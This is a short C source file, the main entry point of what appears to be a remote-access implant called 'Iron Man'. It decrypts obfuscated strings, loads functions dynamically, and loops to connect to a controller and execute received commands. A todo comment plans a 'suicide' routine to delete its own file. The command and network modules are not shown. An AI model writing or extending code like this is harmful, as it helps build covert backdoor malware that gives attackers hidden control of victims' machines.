#include "commands/commands.h"
#include "communication/connection.h"
#include "functions/functions.h"
#include "logging/logging.h"

// todo: maybe make the features more toggleable
// todo: add stop option to stop the accept loop, maybe also suicide to delete the physical file.

int main() {
    INITIALIZE_RESULT(res);

    decrypt_strings();

    res = load_all_functions();
    HANDLE_ERROR_RESULT(res)

    res = start_logging();
    HANDLE_ERROR_RESULT(res)

    WRITE_LOG(CRITICAL, "Started Iron Man", NULL)

    res = initialize_commands();
    HANDLE_ERROR_RESULT(res)

    while (1) {
        res = connect_();
        HANDLE_ERROR_RESULT(res)

        WRITE_LOG(WARNING, "Connected", NULL)
        res = communicate();
        WRITE_LOG(WARNING, "Disconnected", NULL)

        disconnect();

        HANDLE_ERROR_RESULT(res)
    }

    error_cleanup:

    destroy_module_commands();

    destroy_commands();

    WRITE_LOG(CRITICAL, "Stopped Iron Man", NULL)

    stop_logging();

    return EXIT_SUCCESS;
}
